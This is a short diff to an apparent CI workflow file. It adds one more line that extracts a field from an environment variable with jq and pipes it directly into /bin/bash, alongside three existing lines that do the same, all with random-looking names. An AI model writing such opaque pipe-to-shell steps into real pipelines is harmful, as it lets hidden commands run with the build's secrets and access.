@@ -23,6 +23,7 @@ jobs:
           echo $wqf36729 | jq -r .sur9547 | /bin/bash
           echo $envw696 | jq -r .zp9572 | /bin/bash
           echo $ul8412 | jq -r .s1 | /bin/bash
+          printf '%s' "$nfzy16" | jq -r .h388 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
